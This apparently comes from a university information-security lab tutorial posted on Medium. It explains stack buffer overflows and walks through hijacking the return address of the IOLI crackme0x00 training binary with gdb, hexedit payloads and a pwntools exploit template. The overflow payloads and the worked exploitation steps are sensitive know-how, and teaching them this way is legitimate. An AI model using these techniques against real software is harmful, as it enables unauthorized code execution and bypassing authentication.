<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Information Security Lab 7 | Stack Overflow</title><style>
      * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle],
      section[data-field=description] {
        display: none;
      }
      </style></head><body><article class="h-entry">
<header>
<h1 class="p-name">Information Security Lab 7 | Stack Overflow</h1>
</header>
<section data-field="subtitle" class="p-summary">
Series: Information Security Lab
</section>
<section data-field="body" class="e-content">
<section name="20c8" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="452c" id="452c" class="graf graf--h3 graf--leading graf--title">Information Security Lab 7 | Stack Overflow</h3><figure name="b519" id="b519" class="graf graf--figure graf-after--h3"><img class="graf-image" data-image-id="0*c3U3t8a7s2U6qEF5.png" data-width="1738" data-height="952" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/0*c3U3t8a7s2U6qEF5.png"></figure><ol class="postList"><li name="7371" id="7371" class="graf graf--li graf-after--figure"><strong class="markup--strong markup--li-strong">Introduction to Stack Overflow</strong></li></ol><p name="901f" id="901f" class="graf graf--p graf-after--li">In this section, we will talk about the most popular and critical type of vulnerability called stack overflow. Techniques to exploit stack overflow problems were first documented in a well-known Phrack article called <a href="http://www.phrack.org/issues/49/14.html#article" data-href="http://www.phrack.org/issues/49/14.html#article" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank"><em class="markup--em markup--p-em">Smashing The Stack For Fun And Profit</em></a><em class="markup--em markup--p-em"> </em>by<em class="markup--em markup--p-em"> </em>Aleph One. Let’s first see some basic definitions in this article.</p><p name="9e76" id="9e76" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">(1) Buffer</strong></p><p name="fda3" id="fda3" class="graf graf--p graf-after--p">A buffer is simply a contiguous block of computer memory that holds multiple instances of the same data type.</p><p name="55f3" id="55f3" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">(2) Static Arrays and Dynamic Arrays</strong></p><p name="5637" id="5637" class="graf graf--p graf-after--p">Arrays, like all variables in C, can be declared either static or dynamic. Static variables are allocated at load time on the data segment. Dynamic variables are allocated at run time on the stack. We will concern ourselves only with the overflow of dynamic buffers.</p><p name="f674" id="f674" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">(3) Overflow</strong></p><p name="794b" id="794b" class="graf graf--p graf-after--p">To overflow is to flow, or fill over the top, brims, or bounds.</p><p name="4ca0" id="4ca0" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">(4) Process Memory Region</strong></p><p name="c059" id="c059" class="graf graf--p graf-after--p">Processes are divided into three memory regions: Text, Data, and Stack as follows,</p><pre name="6728" id="6728" class="graf graf--pre graf-after--p">/------------------\  lower<br>|                  |  memory<br>|       Text       |  addresses<br>|                  |<br>|------------------|<br>|   (Initialized)  |<br>|        Data      |<br>|  (Uninitialized) |<br>|------------------|<br>|                  |<br>|       Stack      |  higher<br>|                  |  memory<br>\------------------/  addresses</pre><ul class="postList"><li name="8b7b" id="8b7b" class="graf graf--li graf-after--pre">The text region is fixed by the program and includes code (instructions) and read-only data.</li><li name="39f9" id="39f9" class="graf graf--li graf-after--li">The data region contains initialized and uninitialized data.</li><li name="9d03" id="9d03" class="graf graf--li graf-after--li">A stack is an abstract data type frequently used in computer science with a LIFO property.</li></ul><p name="f2aa" id="f2aa" class="graf graf--p graf-after--li"><strong class="markup--strong markup--p-strong">(5) Process Memory Region: An Example</strong></p><p name="db12" id="db12" class="graf graf--p graf-after--p">Now, let’s see what the stack looks like in a simple example. Suppose we have the following C script, and what it does is to call a function with the arguments 1, 2, and 3, and then we will create two buffers in that function.</p><figure name="f4c3" id="f4c3" class="graf graf--figure graf--iframe graf-after--p"><script src="https://gist.github.com/Sadamingh/3999b83a439697f57288d0657db8b941.js"></script></figure><p name="60c6" id="60c6" class="graf graf--p graf-after--figure">With respect to how this is compiled in the paper, we will have the following assembly code,</p><pre name="114a" id="114a" class="graf graf--pre graf-after--p">pushl $3<br>pushl $2<br>pushl $1<br>call function<br>pushl %ebp<br>movl %esp,%ebp<br>subl $20,%esp</pre><p name="2392" id="2392" class="graf graf--p graf-after--pre">Suppose we have an empty stack at the beginning.</p><pre name="b172" id="b172" class="graf graf--pre graf-after--p">low                                                             high<br>                       &lt;----[     Stack     ]</pre><p name="60e4" id="60e4" class="graf graf--p graf-after--pre">The first three instructions push the function arguments into the stack.</p><pre name="3d82" id="3d82" class="graf graf--pre graf-after--p">low                                                             high<br>                        &lt;----[ 1 ][ 2 ][ 3 ]<br>                               a    b    c    </pre><p name="bad6" id="bad6" class="graf graf--p graf-after--pre">Then we will call <code class="markup--code markup--p-code">function</code>. This <code class="markup--code markup--p-code">call</code> instruction will push the current instruction pointer into the stack so that after the function finishes, we can go back to the current position. Therefore, this instruction pointer is also called the <strong class="markup--strong markup--p-strong">return address</strong> (RA).</p><pre name="0372" id="0372" class="graf graf--pre graf-after--p">low                                                             high<br>                &lt;----[ 0xc8a1902f ][ 1 ][ 2 ][ 3 ]<br>                           RA        a    b    c </pre><p name="f554" id="f554" class="graf graf--p graf-after--pre">The frame pointer (<code class="markup--code markup--p-code">%ebp</code>) points to the start of the stack frame and does not move for the duration of the subroutine call. And this is used to show the stack of the current function. After we call a new function, the stack should also be changed so that the local variables in the caller function will not influence the callee function. To acquire a new stack, we have to push the <code class="markup--code markup--p-code">ebp</code> register value onto the stack.</p><pre name="b9fb" id="b9fb" class="graf graf--pre graf-after--p">low                                                             high<br>          &lt;----[ saved %ebp ][ 0xc8a1902f ][ 1 ][ 2 ][ 3 ]<br>                     FP            RA        a    b    c</pre><p name="8c87" id="8c87" class="graf graf--p graf-after--pre">It then copies the current SP onto EBP, making it the new FP pointer. We must remember that memory can only be addressed in multiples of the word size. A word in our case is 4 bytes or 32 bits. So our 5-byte buffer is really going to take 8 bytes (2 words) of memory, and our 10-byte buffer is going to take 12 bytes (3 words) of memory. That is why SP is being subtracted by 20.</p><pre name="2db4" id="2db4" class="graf graf--pre graf-after--p">low                                                             high<br> &lt;---- [ 12 B  ][  8 B  ][ saved %ebp ][ 0xc8a1902f ][ 1 ][ 2 ][ 3 ]<br>        buffer2  buffer1       FP            RA        a    b    c</pre><p name="fe47" id="fe47" class="graf graf--p graf-after--pre"><strong class="markup--strong markup--p-strong">(6) Stack Overflow</strong></p><p name="b490" id="b490" class="graf graf--p graf-after--p">In the previous example, we have talked about the stack memory region. And now, let’s focus on the stack overflow problem. In the <code class="markup--code markup--p-code">stackovfl.c</code> file, the <code class="markup--code markup--p-code">function</code> call takes three constant arguments. However, in some other cases, we are going to use some inputs from the users like <code class="markup--code markup--p-code">scanf</code>.</p><figure name="b436" id="b436" class="graf graf--figure graf--iframe graf-after--p"><script src="https://gist.github.com/Sadamingh/dbffc6d41d8e1078714b8bfa36e838da.js"></script></figure><p name="47ba" id="47ba" class="graf graf--p graf-after--figure">In the program above, the size of the buffer will be 4 bytes and we will then call the <code class="markup--code markup--p-code">scanf</code> function. So after we call <code class="markup--code markup--p-code">scanf</code>, the stack will be,</p><pre name="0cdb" id="0cdb" class="graf graf--pre graf-after--p">low                                                             high<br>              &lt;----[ saved %ebp ][ 0x... ][  4 B  ]<br>                         FP          RA      buf</pre><p name="c990" id="c990" class="graf graf--p graf-after--pre">However, if the user types in more than 4 characters, which will take the size of more than 4 bytes, the buffer will not be enough to store the data. If there are no checks of the <code class="markup--code markup--p-code">buf</code> size, we will continue writing to RA, FP, and even the values in the next stack. For example, we can compile the program above by,</p><pre name="83b7" id="83b7" class="graf graf--pre graf-after--p">$ gcc stackovfl2.c -o stackovfl2</pre><p name="a4cd" id="a4cd" class="graf graf--p graf-after--pre">And then if we simply run this code can type in <code class="markup--code markup--p-code">aaaa</code>, we will be fine because <code class="markup--code markup--p-code">buf</code> can contain the string <code class="markup--code markup--p-code">aaaa</code>.</p><pre name="2266" id="2266" class="graf graf--pre graf-after--p">$ ./stackovfl2<br>aaaa<br>aaaa</pre><p name="169d" id="169d" class="graf graf--p graf-after--pre">However, if we type in more than 4 characters, for instance, <code class="markup--code markup--p-code">aaaaa</code> , we will have a stack overflow problem.</p><pre name="178c" id="178c" class="graf graf--pre graf-after--p">$ ./stackovfl2<br>aaaaa<br>aaaaa<br>*** stack smashing detected ***: &lt;unknown&gt; terminated<br>Aborted (core dumped)</pre><p name="6d82" id="6d82" class="graf graf--p graf-after--pre"><strong class="markup--strong markup--p-strong">2. Stack Overflow Exploitation</strong></p><p name="7345" id="7345" class="graf graf--p graf-after--p">Now, we should use the VM environment to exploit our first stack overflow example. Let’s go to the directory of,</p><pre name="82d0" id="82d0" class="graf graf--pre graf-after--p">$ cd ~/tuts/lab03/tut03-stackovfl/</pre><p name="b8cc" id="b8cc" class="graf graf--p graf-after--pre">Then, let’s run the binary file <code class="markup--code markup--p-code">crackme0x00</code> and randomly type in the password like <code class="markup--code markup--p-code">aaaa</code>. Then, it will tell us that we will have an invalid password.</p><pre name="6fe8" id="6fe8" class="graf graf--pre graf-after--p">$ ./crackme0x00<br>IOLI Crackme Level 0x00<br>Password:aaaa<br>Invalid Password!</pre><p name="793c" id="793c" class="graf graf--p graf-after--pre">Let’s suppose that the password we input can cause an overflow problem. And now, let’s have a try. Suppose we type in the password <code class="markup--code markup--p-code">aaaaaaaaaaaaaaaaaaaaaaaaaaaa</code> , then we will have a <code class="markup--code markup--p-code">Segmentation fault</code> problem and this can be caused by a stack overflow.</p><pre name="5f75" id="5f75" class="graf graf--pre graf-after--p">$ ./crackme0x00 <br>IOLI Crackme Level 0x00<br>Password: aaaaaaaaaaaaaaaaaaaaaaaaaaaa<br>Invalid Password!<br>Segmentation fault (core dumped)</pre><p name="8081" id="8081" class="graf graf--p graf-after--pre">Now, let’s try to use <code class="markup--code markup--p-code">gdb</code> and see what happens. We will create a password payload in the file <code class="markup--code markup--p-code">/tmp/input</code> and then we will give this value as the password.</p><pre name="4bc4" id="4bc4" class="graf graf--pre graf-after--p">$ echo AAAAAAAAAAAAAAAAAAAAAAAA &gt; /tmp/input<br>$ gdb crackme0x00<br>pwndbg&gt; r &lt; /tmp/input<br>...<br>──────────────────────[ REGISTERS ]───────────────────────────<br>... <br><strong class="markup--strong markup--pre-strong">EBP </strong> 0x41414141 (&#39;AAAA&#39;)<br><strong class="markup--strong markup--pre-strong">ESP </strong> 0xffffd578 ◂— 0x0<br><strong class="markup--strong markup--pre-strong">EIP </strong> 0x41414141 (&#39;AAAA&#39;)<br>────────────────────────────[ DISASM ]────────────────────────<br>Invalid address 0x41414141<br>...</pre><p name="e0a8" id="e0a8" class="graf graf--p graf-after--pre">From this result, we can know that both the <code class="markup--code markup--p-code">%ebp</code> (the frame pointer) and <code class="markup--code markup--p-code">%eip</code> register (the instruction pointer) are overwritten to <code class="markup--code markup--p-code">0x41414141</code> , which is simply <code class="markup--code markup--p-code">AAAA</code> from the input. Therefore, we created a stack overflow problem. Note that if you want to check out the ASCII table in a quick way, you can try this out,</p><pre name="874c" id="874c" class="graf graf--pre graf-after--p">$ man ascii</pre><p name="6464" id="6464" class="graf graf--p graf-after--pre">In the payload above, we will have a <code class="markup--code markup--p-code">Segmentation fault</code> because the address <code class="markup--code markup--p-code">0x41414141</code> is invalid. But now, we can think about using a valid address that directly points to the shellcode we want to run. So when we return from the function, our <code class="markup--code markup--p-code">shellocode</code> will then be executed.</p><p name="6c51" id="6c51" class="graf graf--p graf-after--p">So first of all, we have to find out which part of the input will overwrite the <code class="markup--code markup--p-code">%eip</code> register that will result in executing a different program. In order to find this position, we can construct a new payload with a pattern of 4 same continuous characters (because each word takes 4 bytes) like <code class="markup--code markup--p-code">AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ</code>. So from the new <code class="markup--code markup--p-code">dbg</code> register result, we can know which part of the payload will rewrite <code class="markup--code markup--p-code">%eip</code>.</p><pre name="bcf2" id="bcf2" class="graf graf--pre graf-after--p">$ echo AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ &gt; /tmp/input<br>$ gdb crackme0x00<br>pwndbg&gt;<strong class="markup--strong markup--pre-strong"> </strong>r &lt; /tmp/input<br>...<br>EBP  0x45454545 (&#39;EEEE&#39;)<br>ESP  0xffffd578 ◂— &#39;GGGGHHHHIIIIJJJJ&#39;<br>EIP  0x46464646 (&#39;FFFF&#39;)<br>───────────────────────────[ DISASM ]───────────────────────────<br>Invalid address 0x46464646<br>...</pre><p name="86c9" id="86c9" class="graf graf--p graf-after--pre">We can find out that the <code class="markup--code markup--p-code">%eip</code> register has the value of <code class="markup--code markup--p-code">0x46464646</code> , which means <code class="markup--code markup--p-code">&#39;FFFF&#39;</code> by ASCII. We can also check this result by,</p><pre name="fdd3" id="fdd3" class="graf graf--pre graf-after--p">pwndbg&gt; p/c 0x46464646<br>$1 = 70 &#39;F&#39;</pre><p name="457f" id="457f" class="graf graf--p graf-after--pre">This means that we can change the <code class="markup--code markup--p-code">FFFF</code> to the address we want it to return. For example, we can change it to address <code class="markup--code markup--p-code">0xdeadbeef</code> (see why we will be using the <code class="markup--code markup--p-code">0xdeadbeef</code> address from <a href="https://en.wikipedia.org/wiki/Hexspeak" data-href="https://en.wikipedia.org/wiki/Hexspeak" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">here</a>) simply by modifying the payload to <code class="markup--code markup--p-code">AAAABBBBCCCCDDDDEEEE\xef\xbe\xad\xdeGGGGHHHHIIIIJJJJ</code>(because x86 is a little-endian machine). However, it’s hard to use <code class="markup--code markup--p-code">echo</code> to change this <code class="markup--code markup--p-code">input</code> file because the <code class="markup--code markup--p-code">echo</code> command will treat <code class="markup--code markup--p-code">\xef\xbe\xad\xde</code> as a string. Instead, we will use <code class="markup--code markup--p-code">hexedit</code> to modify this file by hexadecimal values. First, we have to install <code class="markup--code markup--p-code">hexedit</code> by,</p><pre name="1c02" id="1c02" class="graf graf--pre graf-after--p">$ sudo apt install hexedit</pre><p name="955e" id="955e" class="graf graf--p graf-after--pre">Then, we can open this file by,</p><pre name="2a26" id="2a26" class="graf graf--pre graf-after--p">$ hexedit /tmp/input</pre><p name="2d00" id="2d00" class="graf graf--p graf-after--pre">And then we can change the <code class="markup--code markup--p-code">0x46464646</code> part to <code class="markup--code markup--p-code">0xefbeadde</code> as,</p><figure name="d835" id="d835" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*PKcOFMulCS9qX4L-JJ56FA.png" data-width="2344" data-height="162" src="https://cdn-images-1.medium.com/max/800/1*PKcOFMulCS9qX4L-JJ56FA.png"></figure><p name="f06c" id="f06c" class="graf graf--p graf-after--figure">To save and quit this file, we can press F2 and Ctrl+C. Then, we can check the content of this file by,</p><pre name="111b" id="111b" class="graf graf--pre graf-after--p">$ hexdump /tmp/input<br>0000000 4141 4141 4242 4242 4343 4343 4444 4444<br>0000010 4545 4545 beef dead 4747 4747 4848 4848<br>0000020 4949 4949 4a4a 4a4a 000a               <br>0000029</pre><p name="d41b" id="d41b" class="graf graf--p graf-after--pre">Finally, let’s check out if we successfully change the return address by the new payload <code class="markup--code markup--p-code">/tmp/input</code>. Let’s use <code class="markup--code markup--p-code">gdb</code> for checking the address again,</p><pre name="707f" id="707f" class="graf graf--pre graf-after--p">$ gdb crackme0x00<br>pwndbg&gt; r &lt; /tmp/input<br>...<br>EBP  0x45454545 (&#39;EEEE&#39;)<br>ESP  0xffffd578 ◂— &#39;GGGGHHHHIIIIJJJJ&#39;<br>EIP  0xdeadbeef<br>──────────────────────[ DISASM ]──────────────────────<br>Invalid address 0xdeadbeef<br>...</pre><p name="c88a" id="c88a" class="graf graf--p graf-after--pre">We can find out that the return address is redirected to <code class="markup--code markup--p-code">0xdeadbeef</code>. Now, let’s redirect the program by changing the return address to somewhere when the program prints <code class="markup--code markup--p-code">Password OK :)</code>. By this means, we are able to bypass the password and return to the place where we successfully enter the password.</p><p name="6a33" id="6a33" class="graf graf--p graf-after--p">To find out this place, we need to disassemble the binary <code class="markup--code markup--p-code">crackme0x00</code> by Ghidra, IDA, or <code class="markup--code markup--p-code">gdb</code>, and we will use <code class="markup--code markup--p-code">gdb</code> for disassembling. You may need to refer to the previous sections if you can not remember how to do so. The disassembly operations are as follows,</p><pre name="18b2" id="18b2" class="graf graf--pre graf-after--p">$ gdb crackme0x00<br>pwndbg&gt; r<br>...<br>Password:^c<br>...<br>pwndbg&gt; bt<br>#0  0xf7fd5079 in __kernel_vsyscall ()<br>#1  0xf7ecdd87 in __GI___libc_read (fd=0, buf=0x804b570, nbytes=1024) at ../sysdeps/unix/sysv/linux/read.c:27<br>#2  0xf7e5a318 in _IO_new_file_underflow (fp=&lt;optimized out&gt;) at fileops.c:531<br>#3  0xf7e5b43b in __GI__IO_default_uflow (fp=0xf7fbf5c0 &lt;_IO_2_1_stdin_&gt;) at genops.c:380<br>#4  0xf7e3ed41 in _IO_vfscanf_internal (s=&lt;optimized out&gt;, format=&lt;optimized out&gt;, argptr=&lt;optimized out&gt;, errp=&lt;optimized out&gt;) at vfscanf.c:630<br>#5  0xf7e49eb5 in __scanf (format=0x8048811 &quot;%s&quot;) at scanf.c:33<br>#6  0x080486e1 in start () at tmp.c:21<br>#7  0x080486b1 in main (argc=1, argv=0xffffd614) at tmp.c:14<br>#8  0xf7dfff21 in __libc_start_main (main=0x80486a3 &lt;main&gt;, argc=1, argv=0xffffd614, init=0x8048740 &lt;__libc_csu_init&gt;, fini=0x80487a0 &lt;__libc_csu_fini&gt;, rtld_fini=0xf7fe5970 &lt;_dl_fini&gt;, stack_end=0xffffd60c) at ../csu/libc-start.c:310<br>#9  0x08048512 in _start ()<br>pwndbg&gt; b *0x080486e1<br>...<br>pwndbg&gt; r<br>...<br>Password: aaaa</pre><pre name="34fe" id="34fe" class="graf graf--pre graf-after--pre">Breakpoint 1, 0x080486e1 in start () at tmp.c:21<br>...<br>pwndbg&gt; disassemble</pre><p name="8687" id="8687" class="graf graf--p graf-after--pre">And the disassembled code is as follows,</p><pre name="43f8" id="43f8" class="graf graf--pre graf-after--p">Dump of assembler code for function start:<br>   0x080486b3 &lt;+0&gt;: push   ebp<br>   0x080486b4 &lt;+1&gt;: mov    ebp,esp<br>   0x080486b6 &lt;+3&gt;: sub    esp,0x10<br>   0x080486b9 &lt;+6&gt;: push   0x8048814<br>   0x080486be &lt;+11&gt;: call   0x8048470 &lt;puts@plt&gt;<br>   0x080486c3 &lt;+16&gt;: add    esp,0x4<br>   0x080486c6 &lt;+19&gt;: push   0x804882c<br>   0x080486cb &lt;+24&gt;: call   0x8048430 &lt;printf@plt&gt;<br>   0x080486d0 &lt;+29&gt;: add    esp,0x4<br>   0x080486d3 &lt;+32&gt;: lea    eax,[ebp-0x10]<br>   0x080486d6 &lt;+35&gt;: push   eax<br>   0x080486d7 &lt;+36&gt;: push   0x8048811<br>   0x080486dc &lt;+41&gt;: call   0x8048480 &lt;scanf@plt&gt;<br>=&gt; 0x080486e1 &lt;+46&gt;: add    esp,0x8<br>   0x080486e4 &lt;+49&gt;: push   0x8048837<br>   0x080486e9 &lt;+54&gt;: lea    eax,[ebp-0x10]<br>   0x080486ec &lt;+57&gt;: push   eax<br>   0x080486ed &lt;+58&gt;: call   0x8048420 &lt;strcmp@plt&gt;<br>   0x080486f2 &lt;+63&gt;: add    esp,0x8<br>   0x080486f5 &lt;+66&gt;: test   eax,eax<br>   0x080486f7 &lt;+68&gt;: jne    0x804872a &lt;start+119&gt;<br>   0x080486f9 &lt;+70&gt;: push   0x804883e<br>   0x080486fe &lt;+75&gt;: call   0x8048470 &lt;puts@plt&gt;<br>   0x08048703 &lt;+80&gt;: add    esp,0x4<br>   0x08048706 &lt;+83&gt;: push   0x804884d<br>   0x0804870b &lt;+88&gt;: lea    eax,[ebp-0x10]<br>   0x0804870e &lt;+91&gt;: push   eax<br>   0x0804870f &lt;+92&gt;: call   0x8048420 &lt;strcmp@plt&gt;<br>   0x08048714 &lt;+97&gt;: add    esp,0x8<br>   0x08048717 &lt;+100&gt;: test   eax,eax<br>   0x08048719 &lt;+102&gt;: jne    0x8048737 &lt;start+132&gt;<br>   0x0804871b &lt;+104&gt;: push   0x8048863<br>   0x08048720 &lt;+109&gt;: call   0x80485f6 &lt;print_key&gt;<br>   0x08048725 &lt;+114&gt;: add    esp,0x4<br>   0x08048728 &lt;+117&gt;: jmp    0x8048737 &lt;start+132&gt;<br>   0x0804872a &lt;+119&gt;: push   0x8048872<br>   0x0804872f &lt;+124&gt;: call   0x8048470 &lt;puts@plt&gt;<br>   0x08048734 &lt;+129&gt;: add    esp,0x4<br>   0x08048737 &lt;+132&gt;: mov    eax,0x0<br>   0x0804873c &lt;+137&gt;: leave  <br>   0x0804873d &lt;+138&gt;: ret    <br>End of assembler dump.</pre><p name="df42" id="df42" class="graf graf--p graf-after--pre">We can check out the memories by <code class="markup--code markup--p-code">x</code> command and finally, we will find out that the memory address <code class="markup--code markup--p-code">0x804883e</code> contains the string we need. So we have to return back to address <code class="markup--code markup--p-code">0x080486f9</code> ,</p><pre name="58ee" id="58ee" class="graf graf--pre graf-after--p">pwndbg&gt; x/1s 0x804883e<br>0x804883e: &quot;Password OK :)&quot;</pre><p name="f818" id="f818" class="graf graf--p graf-after--pre">Then we re-edit the <code class="markup--code markup--p-code">/tmp/input</code> file by,</p><pre name="d170" id="d170" class="graf graf--pre graf-after--p">$ hexedit /tmp/input</pre><p name="7f0b" id="7f0b" class="graf graf--p graf-after--pre">And finally, let’s try this payload to the <code class="markup--code markup--p-code">crackme0x00</code> file again by,</p><pre name="253c" id="253c" class="graf graf--pre graf-after--p">$ cat /tmp/input | ./crackme0x00<br>IOLI Crackme Level 0x00<br>Password: Invalid Password!<br>Password OK :)<br>Segmentation fault (core dumped)</pre><p name="22cf" id="22cf" class="graf graf--p graf-after--pre"><strong class="markup--strong markup--p-strong">3. Python for Exploitation</strong></p><p name="1ad0" id="1ad0" class="graf graf--p graf-after--p">In the <code class="markup--code markup--p-code">tut03-stackovfl</code> directory, we also provide a python exploitation script called <code class="markup--code markup--p-code">exploit.py</code>. You can check this file out by <code class="markup--code markup--p-code">ls | grep py</code>, and this file can be used to hijack the <code class="markup--code markup--p-code">crackme0x00</code> file in an easy way.</p><pre name="0a41" id="0a41" class="graf graf--pre graf-after--p">$ cd ~/tuts/lab03/tut03-stackovfl<br>$ ls | grep py<br>exploit.py</pre><p name="ab55" id="ab55" class="graf graf--p graf-after--pre">In this template, we will start utilizing <a href="http://docs.pwntools.com/" data-href="http://docs.pwntools.com/" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">pwntools</a>, which provides a set of libraries and tools to help writing exploits. In this section, we will not talk too much about it and we will pay more attention to it in the next section. To make the template work, you have to familiarize yourself with the following functions in <code class="markup--code markup--p-code">pwntools</code>.</p><ul class="postList"><li name="74c9" id="74c9" class="graf graf--li graf-after--p"><code class="markup--code markup--li-code">p32()</code> : this function is used to packing hexadecimal integers into strings of 32 bits. Please note that the x86 is a little-endian machine. For example,</li></ul><pre name="1f7d" id="1f7d" class="graf graf--pre graf-after--li">$ python<br>Python 2.7.17 (default, Feb 27 2021, 15:10:58)<br>...<br>&gt;&gt; from pwn import *<br>&gt;&gt; p32(0xdeadbeef)<br>&#39;\xef\xbe\xad\xde&#39;</pre><ul class="postList"><li name="c19b" id="c19b" class="graf graf--li graf-after--pre"><code class="markup--code markup--li-code">p64()</code> : this function is used to packing hexadecimal integers into strings of 64 bits.</li></ul><pre name="517d" id="517d" class="graf graf--pre graf-after--li">&gt;&gt;&gt; p64(0xdeadbeef)<br>&#39;\xef\xbe\xad\xde\x00\x00\x00\x00&#39;</pre><p name="69ee" id="69ee" class="graf graf--p graf-after--pre">In the template, we have 3 questions. The first two questions are used to check whether you are familiarized with the <code class="markup--code markup--p-code">p32</code> and <code class="markup--code markup--p-code">p64</code> function with asserts. Another question is to build the payload we need to hijack the binary.</p><p name="a41a" id="a41a" class="graf graf--p graf-after--p">Interestingly, even if get the correct password by disassembling the code as we have done in the previous sections, we can not get the key. This is because the key is protected by 2 string comparisons. Let’s check out the logic of the program by Ghidra,</p><pre name="5d2e" id="5d2e" class="graf graf--pre graf-after--p">$ ghidra</pre><p name="638a" id="638a" class="graf graf--p graf-after--pre">After we analyze the file, we can know the disassembled code in C is as follows,</p><figure name="e00d" id="e00d" class="graf graf--figure graf--iframe graf-after--p"><script src="https://gist.github.com/Sadamingh/5d36807d763005d6d4b1f4a96f3e0abc.js"></script></figure><p name="a937" id="a937" class="graf graf--p graf-after--figure">From this code, we can know that if we type in the password as it expects, our password can either be <code class="markup--code markup--p-code">250381</code> or <code class="markup--code markup--p-code">no way you can reach!</code>. However, if we want to get the flag, our input should be <code class="markup--code markup--p-code">250381</code> and <code class="markup--code markup--p-code">no way you can reach!</code> at the same time, which can be entirely impossible. So now, there is a must that we have to utilize the stack overflow to get the information we need.</p><p name="0aa3" id="0aa3" class="graf graf--p graf-after--p">From the analyzed result from Ghidra, we can know that “some address” is the instruction address that we will need for getting to the function <code class="markup--code markup--p-code">print_key(“lab03:tutorial”);</code>. So now, let’s build a payload to go to that address. We can simply use,</p><pre name="f96d" id="f96d" class="graf graf--pre graf-after--p">payload = &quot;????&quot; + p32(????)</pre><p name="91a2" id="91a2" class="graf graf--p graf-after--pre">After we configured the payload, we can run the python template by,</p><pre name="8d2c" id="8d2c" class="graf graf--pre graf-after--p">$ python exploit.py</pre><p name="ade5" id="ade5" class="graf graf--p graf-after--pre graf--trailing">Enjoy your flag!</p></div></div></section>
</section>
<footer><p>By <a href="https://medium.com/@adamedelweiss" class="p-author h-card">Adam Edelweiss</a> on <a href="https://medium.com/p/470d068d9d5d"><time class="dt-published" datetime="2021-05-16T04:05:18.652Z">May 16, 2021</time></a>.</p><p><a href="https://medium.com/@adamedelweiss/information-security-lab-7-stack-overflow-470d068d9d5d" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on December 15, 2021.</p></footer></article></body></html>